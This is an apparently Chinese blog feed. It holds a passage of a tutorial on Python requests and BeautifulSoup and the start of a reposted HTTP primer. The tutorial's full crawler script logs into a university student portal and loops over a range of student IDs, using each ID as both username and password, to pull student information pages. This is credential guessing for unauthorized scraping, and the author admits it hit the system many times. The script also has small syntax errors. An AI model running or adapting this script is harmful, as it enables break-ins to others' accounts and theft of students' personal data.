&apos;2&apos;,</div><div class="line">	  		&apos;submit.x&apos;: &apos;43&apos;,</div><div class="line">	  		&apos;submit.y&apos; : &apos;12&apos;,</div><div class="line">	  		&apos;operType&apos; : &apos;911&apos;,</div><div class="line">	  		&apos;random_form&apos; : &apos;5129319019753764987&apos;,</div><div class="line">	 		&apos;userName&apos; : &apos;&apos;,</div><div class="line">	 		&apos;passwd&apos; : &apos;&apos;</div><div class="line">	&#125;</div><div class="line">__data2 = &#123;</div><div class="line">			&apos;isValidate&apos;:&apos;false&apos;,</div><div class="line">			&apos;userName&apos;:&apos;&apos;,</div><div class="line">			&apos;passwd&apos;:&apos;&apos;,</div><div class="line">			&apos;operType&apos;:&apos;911&apos;,</div><div class="line">	&#125;</div><div class="line">__posturl1 = &apos;http://xxxx.xxxx.edu.cn/renzheng.jsp&apos;</div><div class="line">__posturl2 = &apos;http://xxxx.xxxx.edu.cn/servlet/adminservlet&apos;</div><div class="line"></div><div class="line">__geturl = &apos;http://xxxx.xxxx.edu.cn/student/studentInfo.jsp?userName=&amp;passwd=&apos;</div></pre></td></tr></table></figure>
<h3 id="Requests库"><a href="#Requests库" class="headerlink" title="Requests库"></a>Requests库</h3><p>Requests是一个Python HTTP库，提供了很多与HTTP相关的方法，我们可以使用dir(requests)查看该库提供的方法</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&gt;&gt;&gt; import requests</div><div class="line">&gt;&gt;&gt; dir(requests)</div><div class="line">[&apos;ConnectionError&apos;, &apos;HTTPError&apos;, &apos;NullHandler&apos;, &apos;PreparedRequest&apos;, &apos;Request&apos;, &apos;RequestException&apos;, &apos;Response&apos;, &apos;Session&apos;, &apos;Timeout&apos;, &apos;TooManyRedirects&apos;, &apos;URLRequired&apos;, &apos;__author__&apos;, &apos;__build__&apos;, &apos;__builtins__&apos;, &apos;__copyright__&apos;, &apos;__doc__&apos;, &apos;__file__&apos;, &apos;__license__&apos;, &apos;__name__&apos;, &apos;__package__&apos;, &apos;__path__&apos;, &apos;__title__&apos;, &apos;__version__&apos;, &apos;adapters&apos;, &apos;api&apos;, &apos;auth&apos;, &apos;certs&apos;, &apos;codes&apos;, &apos;compat&apos;, &apos;cookies&apos;, &apos;delete&apos;, &apos;exceptions&apos;, &apos;get&apos;, &apos;head&apos;, &apos;hooks&apos;, &apos;logging&apos;, &apos;models&apos;, &apos;options&apos;, &apos;patch&apos;, &apos;post&apos;, &apos;put&apos;, &apos;request&apos;, &apos;session&apos;, &apos;sessions&apos;, &apos;status_codes&apos;, &apos;structures&apos;, &apos;utils&apos;]</div></pre></td></tr></table></figure>
<p>在这次过程中主要使用到了Session、get、post和content这几种方法</p>
<h4 id="Session会话对象"><a href="#Session会话对象" class="headerlink" title="Session会话对象"></a>Session会话对象</h4><p>会话对象让你能够跨请求保持某些参数。它也会在同一个 Session 实例发出的所有请求之间保持 cookie</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&gt;&gt;&gt; s = requests.Session()</div><div class="line">&gt;&gt;&gt; r = s.get(&quot;http://uknowsec.cn/&quot;)</div></pre></td></tr></table></figure>
<h4 id="GET提交方式"><a href="#GET提交方式" class="headerlink" title="GET提交方式"></a>GET提交方式</h4><p>以GET提交方式请求响应的URL</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&gt;&gt;&gt; r = requests.get(&quot;http://uknowsec.cn/&quot;,proxies=proxies,timeout=0.001,params=payload)</div></pre></td></tr></table></figure>
<ul>
<li><p>params为GET提交方式传递参数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">r = requests.get(&quot;http://httpbin.org/get&quot;, params=payload)</div></pre></td></tr></table></figure>
</li>
<li><p>proxies如果需要使用代理，你可以通过为任意请求方法提供 proxies 参数来配置单个请求:</p>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">import requests</div><div class="line"></div><div class="line">proxies = &#123;</div><div class="line">  &quot;http&quot;: &quot;http://10.10.1.10:3128&quot;,</div><div class="line">  &quot;https&quot;: &quot;http://10.10.1.10:1080&quot;,</div><div class="line">&#125;</div><div class="line"></div><div class="line">requests.get(&quot;http://example.org&quot;, proxies=proxies)</div></pre></td></tr></table></figure>
<ul>
<li>requests在经过以 timeout 参数设定的秒数时间之后停止等待响应:<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&gt;&gt;&gt; requests.get(&apos;http://github.com&apos;, timeout=0.001)</div><div class="line">Traceback (most recent call last):</div><div class="line">  File &quot;&quot;, line 1, in </div><div class="line">requests.exceptions.Timeout: HTTPConnectionPool(host=&apos;github.com&apos;, port=80): Request timed out. (timeout=0.001)</div></pre></td></tr></table></figure>
</li>
</ul>
<h4 id="POST提交方式"><a href="#POST提交方式" class="headerlink" title="POST提交方式"></a>POST提交方式</h4><p>以GET提交方式请求响应的URL<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">requests.post(&quot;http://example.org&quot;, header=header, data=data)</div></pre></td></tr></table></figure></p>
<ul>
<li>header是需要的header头部信息</li>
</ul>
<p><a href="http://obr4sfdq7.bkt.clouddn.com/2017-05-12_163012.png" target="_blank" rel="external">header头部信息</a></p>
<p>此处我们只需要添加常见的常见的部分即可</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">&apos;User-Agent&apos; : &apos;Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36&apos;,</div><div class="line">&apos;Content-Type&apos;:&apos;application/x-www-form-urlencoded&apos;,</div><div class="line">&apos;Accept&apos;: &apos;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&apos;,</div><div class="line">&apos;Referer&apos;: &apos;http://xxxx.xxxx.edu.cn/&apos;,</div><div class="line">&apos;Accept-Encoding&apos;: &apos;gzip, deflate&apos;,</div><div class="line">&apos;Accept-Language&apos;: &apos;zh-CN,zh;q=0.8&apos;</div></pre></td></tr></table></figure>
<ul>
<li>data为Post提交的信息</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">&apos;displayName&apos; : &apos;&apos;,</div><div class="line">&apos;displayPasswd&apos; : &apos;&apos;,</div><div class="line">&apos;select&apos;: &apos;2&apos;,</div><div class="line">&apos;submit.x&apos;: &apos;43&apos;,</div><div class="line">&apos;submit.y&apos; : &apos;12&apos;,</div><div class="line">&apos;operType&apos; : &apos;911&apos;,</div><div class="line">&apos;random_form&apos; : &apos;5129319019753764987&apos;,</div><div class="line">&apos;userName&apos; : &apos;&apos;,</div><div class="line">&apos;passwd&apos; : &apos;&apos;</div></pre></td></tr></table></figure>
<h4 id="Request部分代码"><a href="#Request部分代码" class="headerlink" title="Request部分代码"></a>Request部分代码</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">def Firstlogin(self):</div><div class="line">	Firstrequest = self.__session.post(self.__posturl1, data=self.__data1, headers=self.__header)</div><div class="line"></div><div class="line">def Secondlogin(self):</div><div class="line">	Secondrequest = self.__session.post(self.__posturl2, data=self.__data2, headers=self.__header)</div></pre></td></tr></table></figure>
<h3 id="BeautifulSoup库"><a href="#BeautifulSoup库" class="headerlink" title="BeautifulSoup库"></a>BeautifulSoup库</h3><p>BeautifulSoup是一个可以从HTML或XML文件中提取数据的Python库.它能够通过你喜欢的转换器实现惯用的文档导航,查找,修改文档的方式,同样可使用dir()查看BeautifulSoup的方法</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&gt;&gt;&gt; import BeautifulSoup</div><div class="line">&gt;&gt;&gt; dir(BeautifulSoup)</div><div class="line">[&apos;BeautifulSOAP&apos;, &apos;BeautifulSoup&apos;, &apos;BeautifulStoneSoup&apos;, &apos;CData&apos;, &apos;Comment&apos;, &apos;DEFAULT_OUTPUT_ENCODING&apos;, &apos;Declaration&apos;, &apos;ICantBelieveItsBeautifulSoup&apos;, &apos;MinimalSoup&apos;, &apos;NavigableString&apos;, &apos;PageElement&apos;, &apos;ProcessingInstruction&apos;, &apos;ResultSet&apos;, &apos;RobustHTMLParser&apos;, &apos;RobustInsanelyWackAssHTMLParser&apos;, &apos;RobustWackAssHTMLParser&apos;, &apos;RobustXMLParser&apos;, &apos;SGMLParseError&apos;, &apos;SGMLParser&apos;, &apos;SimplifyingSOAPParser&apos;, &apos;SoupStrainer&apos;, &apos;StopParsing&apos;, &apos;Tag&apos;, &apos;UnicodeDammit&apos;, &apos;__author__&apos;, &apos;__builtins__&apos;, &apos;__copyright__&apos;, &apos;__doc__&apos;, &apos;__file__&apos;, &apos;__license__&apos;, &apos;__name__&apos;, &apos;__package__&apos;, &apos;__version__&apos;, &apos;_match_css_class&apos;, &apos;buildTagMap&apos;, &apos;chardet&apos;, &apos;codecs&apos;, &apos;generators&apos;, &apos;markupbase&apos;, &apos;name2codepoint&apos;, &apos;re&apos;, &apos;sgmllib&apos;, &apos;types&apos;]</div></pre></td></tr></table></figure>
<h4 id="解析成XML"><a href="#解析成XML" class="headerlink" title="解析成XML"></a>解析成XML</h4><p>默认情况下,Beautiful Soup会将当前文档作为HTML格式解析,如果要解析XML文档,要在 BeautifulSoup 构造方法中加入第二个参数 “xml”:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">soup = BeautifulSoup(markup, &quot;xml&quot;)</div></pre></td></tr></table></figure>
<h4 id="find-all"><a href="#find-all" class="headerlink" title="find_all()"></a>find_all()</h4><p>find_all() 方法将返回文档中符合条件的所有tag,返回结果是值包含一个元素的列表<br>在实践的过程中由于需要的信息是一个包含在一个tables标签下，由于返回的是列表，利用索引定位到响应的tr位置，而后for循环输出td的内容<br>循环输出tables的代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">tables = soup.findAll(&apos;table&apos;)  </div><div class="line">tab = tables[0]  </div><div class="line">for tr in tab.findAll(&apos;tr&apos;):  </div><div class="line">    for td in tr.findAll(&apos;td&apos;):  </div><div class="line">        print td.getText(),</div></pre></td></tr></table></figure></p>
<h4 id="Python中逗号的作用"><a href="#Python中逗号的作用" class="headerlink" title="Python中逗号的作用"></a>Python中逗号的作用</h4><p>在find_all()方法循环输出一个table用到了一个逗号，而后了解到了逗号在Python有特殊的作用</p>
<ul>
<li><p>逗号在参数传递中的使用，作为参数的分隔符<br>例如def  abc(a,b)或者abc(1,2)</p>
</li>
<li><p>逗号在类型转化中的使用, 只有当b元组中只有一个元素的时候 ,需要逗号来转换为元组类型</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">&gt;&gt;&gt; a=11</div><div class="line">&gt;&gt;&gt; b=(a)</div><div class="line">&gt;&gt;&gt; b</div><div class="line">11</div><div class="line">&gt;&gt;&gt; b=(a,)</div><div class="line">&gt;&gt;&gt; b</div><div class="line">(11,)</div><div class="line">&gt;&gt;&gt; b=(a,22)</div><div class="line">&gt;&gt;&gt; b</div><div class="line">(11, 22)</div><div class="line">&gt;&gt;&gt; b=(a,22,)</div><div class="line">&gt;&gt;&gt; b</div><div class="line">(11, 22)</div></pre></td></tr></table></figure>
</li>
<li><p>逗号在输出语句print中的妙用:print语句默认的会在后面加上换行,加了逗号之后,换行就变成了空格</p>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">for i in range(0,5):</div><div class="line">		print i</div><div class="line"></div><div class="line">0</div><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line"></div><div class="line"> for i in range(0,5):</div><div class="line">		print i,</div><div class="line"></div><div class="line">0 1 2 3 4</div></pre></td></tr></table></figure>
<h4 id="BeautifulSoup部分代码"><a href="#BeautifulSoup部分代码" class="headerlink" title="BeautifulSoup部分代码"></a>BeautifulSoup部分代码</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">Thirdrequest = self.__session.get(geturl)</div><div class="line">	page = Thirdrequest.content</div><div class="line">	soup = BeautifulSoup(page,&quot;lxml&quot;)</div><div class="line">tr = soup.findAll(&apos;tr&apos;)</div><div class="line">for i in range(5,14):</div><div class="line">	for td in tr[i].findAll(&apos;td&apos;):</div><div class="line">		print  td.getText(),</div></pre></td></tr></table></figure>
<h3 id="异常处理"><a href="#异常处理" class="headerlink" title="异常处理"></a>异常处理</h3><p>捕捉异常可以使用try/except语句。<br>try/except语句用来检测try语句块中的错误，从而让except语句捕获异常信息并处理。<br>如果你不想在异常发生时结束你的程序，只需在try里捕获它。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">try:</div><div class="line">&lt;语句&gt;        #运行别的代码</div><div class="line">except &lt;名字&gt;：</div><div class="line">&lt;语句&gt;        #如果在try部份引发了&apos;name&apos;异常</div><div class="line">except &lt;名字&gt;，&lt;数据&gt;:</div><div class="line">&lt;语句&gt;        #如果引发了&apos;name&apos;异常，获得附加的数据</div><div class="line">else:</div><div class="line">&lt;语句&gt;        #如果没有异常发生</div></pre></td></tr></table></figure>
<h4 id="使用except而不带任何异常类型"><a href="#使用except而不带任何异常类型" class="headerlink" title="使用except而不带任何异常类型"></a>使用except而不带任何异常类型</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">try:</div><div class="line">    正常的操作</div><div class="line">   ......................</div><div class="line">except:</div><div class="line">    发生异常，执行这块代码</div><div class="line">   ......................</div><div class="line">else:</div><div class="line">    如果没有异常执行这块代码</div></pre></td></tr></table></figure>
<h4 id="使用except而带多种异常类型"><a href="#使用except而带多种异常类型" class="headerlink" title="使用except而带多种异常类型"></a>使用except而带多种异常类型</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">try:</div><div class="line">    正常的操作</div><div class="line">   ......................</div><div class="line">except(Exception1[, Exception2[,...ExceptionN]]]):</div><div class="line">   发生以上多个异常中的一个，执行这块代码</div><div class="line">   ......................</div><div class="line">else:</div><div class="line">    如果没有异常执行这块代码</div></pre></td></tr></table></figure>
<h4 id="try-finally-语句"><a href="#try-finally-语句" class="headerlink" title="try-finally 语句"></a>try-finally 语句</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">try:</div><div class="line">&lt;语句&gt;</div><div class="line">finally:</div><div class="line">&lt;语句&gt;    #退出try时总会执行</div><div class="line">raise</div></pre></td></tr></table></figure>
<h3 id="效果图"><a href="#效果图" class="headerlink" title="效果图"></a>效果图</h3><p><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20170512171743.jpg" alt=""></p>
<h3 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div></pre></td><td class="code"><pre><div class="line"># -*- coding: utf-8 -*-</div><div class="line"># !/usr/bin/python</div><div class="line"></div><div class="line">import requests</div><div class="line">import time</div><div class="line">import os</div><div class="line">from bs4 import BeautifulSoup</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">class UCrawler(object):</div><div class="line">	&quot;&quot;&quot;docstring for UCrawler&quot;&quot;&quot;</div><div class="line">	__header = &#123;</div><div class="line">				&apos;User-Agent&apos; : &apos;Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36&apos;,</div><div class="line">				&apos;Content-Type&apos;:&apos;application/x-www-form-urlencoded&apos;,</div><div class="line">				&apos;Accept&apos;: &apos;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&apos;,</div><div class="line">				&apos;Referer&apos;: &apos;http://xxxx.xxxx.edu.cn/&apos;,</div><div class="line">				&apos;Accept-Encoding&apos;: &apos;gzip, deflate&apos;,</div><div class="line">				&apos;Accept-Language&apos;: &apos;zh-CN,zh;q=0.8&apos;</div><div class="line">		&#125;</div><div class="line">	__data1 = &#123;</div><div class="line">				&apos;displayName&apos; : &apos;&apos;,</div><div class="line">		  		&apos;displayPasswd&apos; : &apos;&apos;,</div><div class="line">		  		&apos;select&apos;: &apos;2&apos;,</div><div class="line">		  		&apos;submit.x&apos;: &apos;43&apos;,</div><div class="line">		  		&apos;submit.y&apos; : &apos;12&apos;,</div><div class="line">		  		&apos;operType&apos; : &apos;911&apos;,</div><div class="line">		  		&apos;random_form&apos; : &apos;5129319019753764987&apos;,</div><div class="line">		 		&apos;userName&apos; : &apos;xxxxxxx&apos;,</div><div class="line">		 		&apos;passwd&apos; : &apos;xxxxxxx&apos;</div><div class="line">		&#125;</div><div class="line">	__data2 = &#123;</div><div class="line">				&apos;isValidate&apos;:&apos;false&apos;,</div><div class="line">				&apos;userName&apos;:&apos;xxxxxxx&apos;,</div><div class="line">				&apos;passwd&apos;:&apos;xxxxxxx&apos;,</div><div class="line">				&apos;operType&apos;:&apos;911&apos;,</div><div class="line">		&#125;</div><div class="line">	__posturl1 = &apos;http://xxxx.xxxx.edu.cn/renzheng.jsp&apos;</div><div class="line">	__posturl2 = &apos;http://xxxx.xxxx.edu.cn/servlet/adminservlet&apos;</div><div class="line"></div><div class="line"></div><div class="line">	__session=requests.Session()</div><div class="line"></div><div class="line">	def Firstlogin(self):</div><div class="line">		Firstrequest = self.__session.post(self.__posturl1, data=self.__data1, headers=self.__header)</div><div class="line"></div><div class="line">	def Secondlogin(self):</div><div class="line">		Secondrequest = self.__session.post(self.__posturl2, data=self.__data2, headers=self.__header)</div><div class="line"></div><div class="line"></div><div class="line">	def PrintAndGet(self):</div><div class="line">		a = range(xxxxxxxx,xxxxxxx)</div><div class="line">		for tmp in a:</div><div class="line">			try:</div><div class="line">				username = str(tmp)</div><div class="line">				password = str(tmp)</div><div class="line">				self.__data1[&apos;userNam&apos;]=username</div><div class="line">				self.__data1[&apos;passwd&apos;]=password</div><div class="line">				self.__data2[&apos;userNam&apos;]=username</div><div class="line">				self.__data2[&apos;passwd&apos;]=password</div><div class="line">				Firstrequest = self.__session.post(self.__posturl1, data=self.__data1, headers=self.__header)</div><div class="line">				Secondrequest = self.__session.post(self.__posturl2, data=self.__data2, headers=self.__header)</div><div class="line">				geturl = http://xxxx.xxxx.edu.cn/student/studentInfo.jsp?userName&apos;+&apos;=&apos;+username+&apos;&amp;&apos;+&apos;passwd=&apos;+password</div><div class="line"></div><div class="line"></div><div class="line">				print &apos;\n&apos;</div><div class="line">			except IndexError:</div><div class="line">				continue</div><div class="line"></div><div class="line">if __name__ == &apos;__main__&apos;:</div><div class="line"></div><div class="line">	U = UCrawler()</div><div class="line">	U.Firstlogin()</div><div class="line">	U.Secondlogin()</div><div class="line">	U.PrintAndGet()</div></pre></td></tr></table></figure>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这个编写过程还是蛮久的，毕竟自己的水平太low了，一边找资料一边写代码，然后查相关的知识点。还多次问学长一些很傻逼的问题，贼尴尬有没有，不过学长还是耐心的教我解决问题，在这个过程中学到很多Python的知识，包括相关的库的使用，常见的问题，异常处理等等方面。另外这整个过程中，可能对系统进行了很多次访问，在此表示歉意，并无恶意只是测试而已。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;点击阅读全文&lt;br&gt;
    
    </summary>
    
      <category term="笔记" scheme="http://uknowsec.cn/categories/notes/"/>
    
    
  </entry>
  
  <entry>
    <title>【转载】HTTP：超文本传输协议</title>
    <link href="http://uknowsec.cn/posts/notes/HTTP%EF%BC%9A%E8%B6%85%E6%96%87%E6%9C%AC%E4%BC%A0%E8%BE%93%E5%8D%8F%E8%AE%AE.html"/>
    <id>http://uknowsec.cn/posts/notes/HTTP：超文本传输协议.html</id>
    <published>2017-05-01T13:34:09.000Z</published>
    <updated>2017-05-01T13:43:53.918Z</updated>
    
    <content type="html"><![CDATA[<p>点击阅读全文<br><a id="more"></a></p>
<h1 id="HTTP简介"><a href="#HTTP简介" class="headerlink" title="HTTP简介"></a>HTTP简介</h1><p>HTTP协议是Hyper Text Transfer Protocol（超文本传输协议）的缩写,是用于从万维网（WWW:World Wide Web ）服务器传输超文本到本地浏览器的传送协议。</p>
<p>HTTP是一个基于TCP/IP通信协议来传递数据（HTML 文件, 图片文件, 查询结果等）。</p>
<p>HTTP是一个属于应用层的面向对象的协议，由于其简捷、快速的方式，适用于分布式超媒体信息系统。它于1990年提出，经过几年的使用与发展，得到不断地完善和扩展。目前在WWW中使用的是HTTP/1.0的第六版，HTTP/1.1的规范化工作正在进行之中，而且HTTP-NG(Next Generation of HTTP)的建议已经提出。</p>
<p>HTTP协议工作于客户端-服务端架构为上。浏览器作为HTTP客户端通过URL向HTTP服务端即WEB服务器发送所有请求。Web服务器根据接收到的请求后，向客户端发送响应信息。</p>
<p><img src="http://upload-images.jianshu.io/upload_images/2964446-5a35e17f298a48e1.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240&amp;_=5984001" alt=""></p>
<h1 id="主要特点"><a href="#主要特点" class="headerlink" title="主要特点"></a>主要特点</h1><ul>
<li><p>1、简单快速：客户向服务器请求服务时，只需传送请求方法和路径。请求方法常用的有GET、HEAD、POST。每种方法规定了客户与服务器联系的类型不同。由于HTTP协议简单，使得HTTP服务器的程序规模小，因而通信速度很快。</p>
</li>
<li><p>2、灵活：HTTP允许传输任意类型的数据对象。正在传输的类型由Content-Type加以标记。</p>
</li>
<li><p>3、无连接：无连接的含义是限制每次连接只处理一个请求。服务器处理完客户的请求，并收到客户的应答后，即断开连接。采用这种方式可以节省传输时间。</p>
</li>
<li><p>4、无状态：HTTP协议是无状态协议。无状态是指协议对于事务处理没有记忆能力。缺少状态意味着如果后续处理需要前面的信息，则它必须重传，这样可能导致每次连接传送的数据量增大。另一方面，在服务器不需要先前信息时它的应答就较快。</p>
</li>
<li><p>5、支持B/S及C/S模式。</p>
</li>
</ul>
<h1 id="HTTP之URL"><a href="#HTTP之URL" class="headerlink" title="HTTP之URL"></a>HTTP之URL</h1><p>HTTP使用统一资源标识符（Uniform Resource Identifiers, URI）来传输数据和建立连接。URL是一种特殊类型的URI，包含了用于查找某个资源的足够的信息</p>
<p>URL,全称是UniformResourceLocator, 中文叫统一资源定位符,是互联网上用来标识某一处资源的地址。以下面这个URL为例，介绍下普通URL的各部分组成：</p>
<p><a href="http://www.aspxfans.com:8080/news/index.asp?boardID=5&amp;ID=24618&amp;page=1#name" target="_blank" rel="external">http://www.aspxfans.com:8080/news/index.asp?boardID=5&amp;ID=24618&amp;page=1#name</a></p>
<p>从上面的URL可以看出，一个完整的URL包括以下几部分：</p>
<ul>
<li><p>1.协议部分：该URL的协议部分为“http：”，这代表网页使用的是HTTP协议。在Internet中可以使用多种协议，如HTTP，FTP等等本例中使用的是HTTP协议。在”HTTP”后面的“//”为分隔符</p>
</li>
<li><p>2.域名部分：该URL的域名部分为“www.aspxfans.com”。一个URL中，也可以使用IP地址作为域名使用</p>
</li>
<li><p>3.端口部分：跟在域名后面的是端口，域名和端口之间使用“:”作为分隔符。端口不是一个URL必须的部分，如果省略端口部分，将采用默认端口</p>
</li>
<li><p>4.虚拟目录部分：从域名后的第一个“/”开始到最后一个“/”为止，是虚拟目录部分。虚拟目录也不是一个URL必须的部分。本例中的虚拟目录是“/news/”</p>
</li>
<li><p>5.文件名部分：从域名后的最后一个“/”开始到“？”为止，是文件名部分，如果没有“?”,则是从域名后的最后一个“/”开始到“#”为止，是文件部分，如果没有“？”和“#”，那么从域名后的最后一个“/”开始到结束，都是文件名部分。本例中的文件名是“index.asp”。文件名部分也不是一个URL必须的部分，如果省略该部分，则使用默认的文件名</p>
</li>
<li><p>6.锚部分：从“#”开始到最后，都是锚部分。本例中的锚部分是“name”。锚部分也不是一个URL必须的部分</p>
</li>
<li><p>7.参数部分：从“？”开始到“#”为止之间的部分为参数部分，又称搜索部分、查询部分。本例中的参数部分为“boardID=5&amp;ID=24618&amp;page=1”。参数可以允许有多个参数，参数与参数之间用“&amp;”作为分隔符。</p>
</li>
</ul>
<h1 id="URI和URL的区别"><a href="#URI和URL的区别" class="headerlink" title="URI和URL的区别"></a>URI和URL的区别</h1><p>URI，是uniform resource identifier，统一资源标识符，用来唯一的标识一个资源。</p>
<p>Web上可用的每种资源如HTML文档、图像、视频片段、程序等都是一个来URI来定位的<br>URI一般由三部组成：</p>
<ul>
<li>①访问资源的命名机制</li>
<li>②存放资源的主机名</li>
<li>③资源自身的名称，由路径表示，着重强调于资源。</li>
</ul>
<p>URL是uniform resource locator，统一资源定位器，它是一种具体的URI，即URL可以用来标识一个资源，而且还指明了如何locate这个资源。</p>
<p>URL是Internet上用来描述信息资源的字符串，主要用在各种WWW客户程序和服务器程序上，特别是著名的Mosaic。<br>采用URL可以用一种统一的格式来描述各种信息资源，包括文件、服务器的地址和目录等。URL一般由三部组成：</p>
<ul>
<li>①协议(或称为服务方式)</li>
<li>②存有该资源的主机IP地址(有时也包括端口号)</li>
<li>③主机资源的具体地址。如目录和文件名等</li>
</ul>
<p>URN，uniform resource name，统一资源命名，是通过名字来标识资源，比如mailto:java-net@java.sun.com。</p>
<p>URI是以一种抽象的，高层次概念定义统一资源标识，而URL和URN则是具体的资源标识的方式。URL和URN都是一种URI。笼统地说，每个 URL 都是 URI，但不一定每个 URI 都是 URL。这是因为 URI 还包括一个子类，即统一资源名称 (URN)，它命名资源但不指定如何定位资源。上面的 mailto、news 和 isbn URI 都是 URN 的示例。</p>
<p>在Java的URI中，一个URI实例可以代表绝对的，也可以是相对的，只要它符合URI的语法规则。而URL类则不仅符合语义，还包含了定位该资源的信息，因此它不能是相对的。<br>在Java类库中，URI类不包含任何访问资源的方法，它唯一的作用就是解析。<br>相反的是，URL类可以打开一个到达资源的流。</p>
<h1 id="HTTP之请求消息Request"><a href="#HTTP之请求消息Request" class="headerlink" title="HTTP之请求消息Request"></a>HTTP之请求消息Request</h1><p>客户端发送一个HTTP请求到服务器的请求消息包括以下格式：</p>
